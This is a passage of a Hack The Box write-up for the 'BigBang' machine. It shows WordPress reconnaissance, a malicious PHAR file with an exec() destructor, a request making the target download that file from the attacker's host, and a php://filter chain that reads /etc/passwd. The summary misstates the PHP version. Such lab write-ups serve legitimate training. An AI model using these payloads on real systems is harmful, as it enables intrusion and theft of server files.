---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - WordPress
  - Plugin
  - buddyforms
  - CVE-2023-26326
  - UnsecureDeserialization
  - CVE-2024-2961
  - PHP
  - glibc
  - iconv
  - BinaryExploitation
  - Container
  - PortForwarding
  - Hash
  - Cracking
  - JohnTheRipper
  - hashcat
  - PasswordReuse
  - APK
  - ReverseEngineering
  - CommandInjection
---

![](images/BigBang.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Directory Busting](#Directory-Busting)
    - [WPScan](#WPScan)
- [CVE-2023-26326: Unsecure Unauthenticated Deserialization in WordPress BuddyForms Plugin](#CVE-2023-26326-Unsecure-Unauthenticated-Deserialization-in-WordPress-BuddyForms-Plugin)
- [Foothold](#Foothold)
    - [CVE-2024-2961: glibc Exploitation](#CVE-2024-2961-glibc-Exploitation)
        - [Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)](#Iconv-set-the-charset-to-RCE-Exploiting-the-glibc-to-hack-the-PHP-engine-part-1)
    - [Custom Exploit Development](#Custom-Exploit-Development)
        - [Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 3)](#Iconv-set-the-charset-to-RCE-Exploiting-the-glibc-to-hack-the-PHP-engine-part-3)
- [Enumeration](#Enumeration)
- [Port Forwarding](#Port-Forwarding)
- [Pivoting](#Pivoting)
- [Privilege Escalation to shawking](#Privilege-Escalation-to-shawking)
    - [Cracking the Hash](#Cracking-the-Hash)
- [user.txt](#usertxt)
- [Pivoting (shawking)](#Pivoting-shawking)
- [Privilege Escalation to developer](#Privilege-Escalation-to-developer)
    - [Cracking the Hash](#Cracking-the-Hash)
    - [Password Re-use](#Password-Re-use)
- [Pivoting (developer)](#Pivoting-developer)
- [Investigating APK](#Investigating-APK)
- [Interacting with app.bigbang.htb](#Interacting-with-appbigbanghtb)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Command Injection](#Command-Injection)
- [root.txt](#roottxt)

## Summary

The box starts with `WordPress` running on port `80/TCP` using the `BuddyForms` plugin in version `2.7.7` and also `PHP 3.8.2`. The application therefore is vulnerable to `CVE-2024-2961` which various possibilities to exploit `glibc` in order to `leak` information from the system or achieve `Remote Code Execution (RCE)` through `iconv`. The research was made by `Ambionics Security` who also provided the corresponding `Proof of Concept (PoC)` exploits. Furthermore they published the necessary tool `wrapwrap` which creates the `PHP Filter Chains` to perform `bypasses` in `PHP`. After leaking the necessary version of `glibc` through `CVE-2024-2961` the modification of the `cnext-exploit.py` is required to gain `foothold` on the box. As the user `www-data` it is necessary to create a `port forward` to access the `MySQL database` which contains a `hash` for the user `shawking`. After `cracking` the `hash` the `privilege escalation` to `shawking` can be done and the `user.txt` can be grabbed. Next the `pivoting` allows to extract more `hashes` but this time from the `Grafana database` on `/opt/data`. After the `hashes` are formatted correctly they can be cracked by using `hashcat`. Through `password re-use` the `privieleges` can be `escalated`  even further to `developer`. As `developer` you can find the `satellite-app.apk` within his `home directory`. Through `Reverse Engineering` of the `.apk` file information on how to interact with the as `root` on port `9090/TCP` running `app.py`. Forwarding port `9090/TCP` allows to use `Command Injection` on the `send_image` function of the `application` and therefore get `root access` and the `root.txt`.

## Reconnaissance

### Port Scanning

As usual we performed a `port scan` to see which ports were available to us to start with the box. We noticed that only port `22/TCP` and port `80/TCP` were opened.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.79.234
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 20:03 CET
Nmap scan report for 10.129.79.234
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

### Enumeration of Port 80/TCP

Since we saw in the output of `Nmap` that the `web server` would redirect us to `http://blog.bigbang.htb/` if we would access it using only the `IP address`, we added `blog.bigbang.htb` directly to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.79.234   blog.bigbang.htb
```

- [http://blog.bigbang.htb/](http://blog.bigbang.htb/)

A quick check on the `tech stack` showed that `WordPress` and also `PHP` were in use. We noticed that the version of `PHP` was a little bit outdated.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://blog.bigbang.htb/
http://blog.bigbang.htb/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.129.79.234], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], PHP[8.3.2], PasswordField[pwd], Script[importmap,module,text/html,text/javascript], Title[BigBang], UncommonHeaders[link], WordPress[6.5.4], X-Powered-By[PHP/8.3.2]
```

The website itself offered not that much besides a `text editor` and a `upload form` for `pictures`.

- [http://blog.bigbang.htb/](http://blog.bigbang.htb/)

![](images/2025-01-25_20-11_80_website.png)

![](images/2025-01-25_20-12_80_website_reviews.png)

But we found a `username` on the page which indicated that the application eventually ran inside a `container` with `root privileges`.

| Username |
| -------- |
| root     |

### Directory Busting

To see if we could find any low-hanging fruits we performed a quick `directory busting` attempt.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://blog.bigbang.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_blog.bigbang.htb/_25-01-25_20-04-51.txt

Target: http://blog.bigbang.htb/

[20:04:51] Starting: 
[20:05:20] 403 -  281B  - /.htaccess.bak1                                   
[20:05:20] 403 -  281B  - /.htaccess.orig                                   
[20:05:20] 403 -  281B  - /.htaccess.sample
[20:05:20] 403 -  281B  - /.htaccess.save
[20:05:20] 403 -  281B  - /.ht_wsr.txt                                      
[20:05:20] 403 -  281B  - /.htaccess_orig
[20:05:20] 403 -  281B  - /.htaccess_sc
[20:05:20] 403 -  281B  - /.htaccessBAK
[20:05:20] 403 -  281B  - /.htm                                             
[20:05:20] 403 -  281B  - /.html
[20:05:20] 403 -  281B  - /.htaccess_extra                                  
[20:05:21] 403 -  281B  - /.htpasswds                                       
[20:05:21] 403 -  281B  - /.httr-oauth
[20:05:21] 403 -  281B  - /.htaccessOLD                                     
[20:05:21] 403 -  281B  - /.htpasswd_test
[20:05:21] 403 -  281B  - /.htaccessOLD2                                    
[20:06:53] 301 -    0B  - /index.php  ->  http://blog.bigbang.htb/          
[20:06:53] 301 -    0B  - /index.php/login/  ->  http://blog.bigbang.htb/login/
[20:07:02] 200 -    7KB - /license.txt                                      
[20:07:33] 200 -    3KB - /readme.html                                      
[20:07:34] 403 -  281B  - /server-status/                                   
[20:07:35] 403 -  281B  - /server-status                                    
[20:08:07] 301 -  323B  - /wp-admin  ->  http://blog.bigbang.htb/wp-admin/  
[20:08:08] 301 -  325B  - /wp-content  ->  http://blog.bigbang.htb/wp-content/
[20:08:08] 409 -    3KB - /wp-admin/setup-config.php                        
[20:08:08] 403 -  281B  - /wp-content/plugins/akismet/akismet.php           
[20:08:08] 200 -    0B  - /wp-content/
[20:08:08] 500 -    0B  - /wp-content/plugins/hello.php                     
[20:08:08] 403 -  281B  - /wp-content/plugins/akismet/admin.php             
[20:08:09] 301 -  326B  - /wp-includes  ->  http://blog.bigbang.htb/wp-includes/
[20:08:09] 200 -    0B  - /wp-includes/rss-functions.php                    
[20:08:09] 200 -    0B  - /wp-cron.php                                      
[20:08:11] 302 -    0B  - /wp-signup.php  ->  http://blog.bigbang.htb/?p=1  
[20:08:11] 200 -  415B  - /wp-content/upgrade/
[20:08:11] 200 -  476B  - /wp-content/uploads/
[20:08:13] 200 -    2KB - /wp-login.php                                     
[20:08:14] 405 -   42B  - /xmlrpc.php                                       
[20:08:15] 400 -    1B  - /wp-admin/admin-ajax.php                           
[20:08:15] 302 -    0B  - /wp-admin/  ->  http://blog.bigbang.htb/wp-login.php?redirect_to=http%3A%2F%2Fblog.bigbang.htb%2Fwp-admin%2F&reauth=1
[20:08:16] 200 -    0B  - /wp-config.php                                     
[20:08:25] 200 -    5KB - /wp-includes/                                      
                                                                             
Task Completed
```

### WPScan

Since we dealt with `WordPress` we ran `WPScan` to look for vulnerable `plugins` or `templates`.

```c
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://blog.bigbang.htb/ --enumerate u,t,p 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.bigbang.htb/ [10.129.79.234]
[+] Started: Sat Jan 25 20:12:56 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2024-09-25T04:52:00.000Z
 | [!] The version is out of date, the latest version is 2.8.13
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:13 <============================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:13
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] twentytwentythree
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.4'

[+] twentytwentytwo
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:42 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:42

[i] User(s) Identified:

[+] root
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] shawking
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jan 25 20:14:07 2025
[+] Requests Done: 464
[+] Cached Requests: 17
[+] Data Sent: 125.78 KB
[+] Data Received: 971.315 KB
[+] Memory used: 275.812 MB
[+] Elapsed time: 00:01:10
```

And indeed we found the `buddyforms` plugin running in version `2.7.7` which was vulnerable to a few things.

| Plugin     | Version |
| ---------- | ------- |
| buddyforms | 2.7.7   |

Furthermore we enumerated another user called `shawking`.

| Username |
| -------- |
| shawking |

## CVE-2023-26326: Unsecure Unauthenticated Deserialization in WordPress BuddyForms Plugin

Our fist attempt was to see if we could leverage `CVE-2023-26326` which described a `Unsecure Unauthenticated Deserialization` vulnerability in the `BuddyForms` plugin.

- [https://pentest-tools.com/vulnerabilities-exploits/wordpress-buddyforms-plugin-278-object-injection-vulnerability_19530](https://pentest-tools.com/vulnerabilities-exploits/wordpress-buddyforms-plugin-278-object-injection-vulnerability_19530)

Our mate `obskur3` did a quick `patch diffing` to identify a vulnerable field or endpoint.

![](images/2025-01-25-21-06_patch_diffing.png)

We prepared a malicious `.phar` file which was designed to reach out to us via `ICMP` if executed.

```c
<?php

class Evil {
  public $cmd;

  public function __construct($command) {
    $this->cmd = $command;
  }

  public function __destruct() {
    // Execute the command
    exec($this->cmd);
  }
}

// create new Phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");
 
// add malicious object with command as metadata
$object = new Evil('ping -c 3 10.10.14.226'); // Replace 'id' with the system command you want to execute
$phar->setMetadata($object);
$phar->stopBuffering();

```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ php --define phar.readonly=0 foobar.php
```

With the `magic bytes` set we targeted the `admin-ajax.php` endpoint mentioned in the article to see if we could upload the `.phar` file and achieve `code execution`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ strings evil.phar 
GIF89a
<?php __HALT_COMPILER(); ?>
O:4:"Evil":1:{s:3:"cmd";s:22:"ping -c 3 10.10.14.226";}
test.txt
text
GBMB
```

- [http://blog.bigbang.htb/wp-admin/admin-ajax.php](http://blog.bigbang.htb/wp-admin/admin-ajax.php)

```c
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://blog.bigbang.htb
Connection: keep-alive
Referer: http://blog.bigbang.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=upload_image_from_url&url=http://10.10.14.226/evil.phar&id=1&accepted_files=image/gif


```

The upload worked!

```c
HTTP/1.1 200 OK
Date: Sat, 25 Jan 2025 20:21:32 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.3.2
Access-Control-Allow-Origin: http://blog.bigbang.htb
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Length: 112
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1.png","attachment_id":162}
```

![](images/2025-01-25_21-22_80_upload_request.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.79.234 - - [25/Jan/2025 21:21:33] "GET /evil.phar HTTP/1.1" 200 -
10.129.79.234 - - [25/Jan/2025 21:21:33] "GET /evil.phar HTTP/1.1" 200 -
```

Unfortunately besides the initial request to grab the file the box didn't reached out to us.

## Foothold
### CVE-2024-2961: glibc Exploitation

Since we didn't know why we couldn't pull of the `deserialization attack` we did a more research and found a series of blog posts from `Ambionics Security` who did some amazing research on attacking `PHP`!

- [https://www.ambionics.io/](https://www.ambionics.io/)

#### Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)

The first part of getting foothold was to exploit `glibc` and escpecially `iconf` in `PHP`.

- [https://github.com/ambionics/wrapwrap](https://github.com/ambionics/wrapwrap)
- [https://www.ambionics.io/blog/iconv-cve-2024-2961-p1](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)

The first blog post also described why we couldn't exploit it using the `.phar` file.

*To illustrate, I'll target a **Wordpress** instance running on **PHP 8.3.x**. To introduce a file read vulnerability, I added the **BuddyForms plugin (v2.7.7)**, which is flawed with [CVE-2023-26326](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8). The bug was originally reported as a PHAR deserialisation bug, but Wordpress does not have any deserialisation gadget chains. In any case, the target runs on PHP 8+, so it is not vulnerable to PHAR attacks.*

So we started with `wrapwrap` which was a tool for testing developed and published by `Ambionics Security`. We cloned the tool and created a `virtual environment` to install all the necessary dependencies.

```c
┌──(kali㉿kali)-[~/opt/payloads]
└─$ git clone https://github.com/ambionics/wrapwrap.git
Cloning into 'wrapwrap'...
remote: Enumerating objects: 43, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 43 (delta 20), reused 32 (delta 12), pack-reused 0 (from 0)
Receiving objects: 100% (43/43), 11.39 KiB | 323.00 KiB/s, done.
Resolving deltas: 100% (20/20), done.
```

```c
┌──(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 -m virtualenv venv
created virtual environment CPython3.12.8.final.0-64 in 414ms
  creator CPython3Posix(dest=/home/kali/opt/payloads/wrapwrap/venv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==24.3.1
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
```

```c
┌──(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ source venv/bin/activate
```

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ pip3 install ten
Collecting ten
  Downloading ten-0.1.5-py3-none-any.whl.metadata (3.2 kB)
Collecting beautifulsoup4<5.0.0,>=4.12.2 (from ten)
  Downloading beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)
Collecting colorama<0.5.0,>=0.4.6 (from ten)
  Downloading colorama-0.4.6-py2.py3-none-any.whl.metadata (17 kB)
Collecting lxml<5.0.0,>=4.9.2 (from ten)
  Downloading lxml-4.9.4-cp312-cp312-manylinux_2_28_x86_64.whl.metadata (3.7 kB)
Collecting pyyaml<7.0,>=6.0 (from ten)
  Using cached PyYAML-6.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)
Collecting requests<3.0.0,>=2.28.2 (from ten)
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting requests-toolbelt>=0.1.10 (from ten)
  Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)
Collecting rich<14.0.0,>=13.3.4 (from ten)
  Downloading rich-13.9.4-py3-none-any.whl.metadata (18 kB)
Collecting soupsieve>1.2 (from beautifulsoup4<5.0.0,>=4.12.2->ten)
  Downloading soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)
Collecting charset-normalizer<4,>=2 (from requests<3.0.0,>=2.28.2->ten)
  Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests<3.0.0,>=2.28.2->ten)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests<3.0.0,>=2.28.2->ten)
  Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests<3.0.0,>=2.28.2->ten)
  Using cached certifi-2024.12.14-py3-none-any.whl.metadata (2.3 kB)
Collecting markdown-it-py>=2.2.0 (from rich<14.0.0,>=13.3.4->ten)
  Downloading markdown_it_py-3.0.0-py3-none-any.whl.metadata (6.9 kB)
Collecting pygments<3.0.0,>=2.13.0 (from rich<14.0.0,>=13.3.4->ten)
  Downloading pygments-2.19.1-py3-none-any.whl.metadata (2.5 kB)
Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich<14.0.0,>=13.3.4->ten)
  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
Downloading ten-0.1.5-py3-none-any.whl (53 kB)
Downloading beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)
Downloading colorama-0.4.6-py2.py3-none-any.whl (25 kB)
Downloading lxml-4.9.4-cp312-cp312-manylinux_2_28_x86_64.whl (8.0 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 8.0/8.0 MB 72.5 MB/s eta 0:00:00
Using cached PyYAML-6.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (767 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)
Downloading rich-13.9.4-py3-none-any.whl (242 kB)
Using cached certifi-2024.12.14-py3-none-any.whl (164 kB)
Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Downloading markdown_it_py-3.0.0-py3-none-any.whl (87 kB)
Downloading pygments-2.19.1-py3-none-any.whl (1.2 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.2/1.2 MB 30.7 MB/s eta 0:00:00
Downloading soupsieve-2.6-py3-none-any.whl (36 kB)
Using cached urllib3-2.3.0-py3-none-any.whl (128 kB)
Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
Installing collected packages: urllib3, soupsieve, pyyaml, pygments, mdurl, lxml, idna, colorama, charset-normalizer, certifi, requests, markdown-it-py, beautifulsoup4, rich, requests-toolbelt, ten
Successfully installed beautifulsoup4-4.12.3 certifi-2024.12.14 charset-normalizer-3.4.1 colorama-0.4.6 idna-3.10 lxml-4.9.4 markdown-it-py-3.0.0 mdurl-0.1.2 pygments-2.19.1 pyyaml-6.0.2 requests-2.32.3 requests-toolbelt-1.0.0 rich-13.9.4 soupsieve-2.6 ten-0.1.5 urllib3-2.3.0
```

Next we created the `filter chain` according to the description in the repository.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 wrapwrap.py /etc/passwd "GIF89a" "" 1000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
```

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ cat chain.txt 
php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
```

And we started our first attempt of reading `/etc/passwd` using `wrapwrap`.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
